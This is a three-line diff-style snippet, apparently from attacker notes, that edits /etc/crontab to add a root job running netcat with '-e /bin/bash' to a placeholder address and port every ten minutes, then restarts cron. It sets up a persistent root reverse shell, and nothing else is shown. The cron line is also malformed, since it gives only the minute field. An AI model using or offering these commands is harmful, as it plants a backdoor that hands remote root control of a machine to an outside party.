@@ -1,0 +1,3 @@
+nano /etc/crontab
+*/10 root nc <ipaddress> <port> -e /bin/bash
+service cron restart
